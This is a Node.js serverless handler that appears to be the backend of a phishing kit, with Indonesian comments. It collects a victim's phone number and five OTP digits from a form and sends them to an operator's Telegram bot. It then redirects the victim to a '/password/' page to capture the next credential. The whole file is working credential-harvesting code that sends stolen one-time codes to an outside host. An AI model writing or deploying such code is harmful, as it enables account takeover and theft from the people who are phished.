const fetch = require("node-fetch"); // kalau Node versi lama

async function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', () => {
      try {
        if (req.headers['content-type']?.includes('application/json')) {
          resolve(JSON.parse(body));
        } else {
          const params = new URLSearchParams(body);
          const data = Object.fromEntries(params.entries());
          resolve(data);
        }
      } catch (err) {
        reject(err);
      }
    });
  });
}

async function sendMessage(botToken, chatId, message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const payload = { chat_id: chatId, text: message, parse_mode: "Markdown" };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    return { success: response.ok, data };
  } catch (err) {
    console.error("Error sending message:", err);
    return { success: false, error: err.message };
  }
}

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.status(405).send("Method Not Allowed");
    return;
  }

  const body = await parseBody(req);
  console.log("Body diterima:", body);

  const { phoneNumber, pin1, pin2, pin3, pin4, pin5, bot_id } = body;
  const pin = `${pin1 || ""}${pin2 || ""}${pin3 || ""}${pin4 || ""}${pin5 || ""}`;

  if (!phoneNumber || !pin) {
    res.status(400).send("Nomor HP atau OTP tidak ditemukan");
    return;
  }

  const message = `( OTP | ${phoneNumber} )\n\n- No HP : \`${phoneNumber}\`\n- Code OTP : \`${pin}\` via Telegram`;

  let botToken, chatId;
  if (bot_id === "1") {
    botToken = "BOT_TOKEN_1";
    chatId   = "CHAT_ID_1";
  } else {
    botToken = "BOT_TOKEN_2";
    chatId   = "CHAT_ID_2";
  }

  const result = await sendMessage(botToken, chatId, message);

  if (result.success) {
    res.writeHead(302, { Location: "/password/" });
    res.end();
  } else {
    console.error("Gagal kirim OTP:", result.error, result.data);
    res.writeHead(302, { Location: "/otp/" });
    res.end();
  }
};
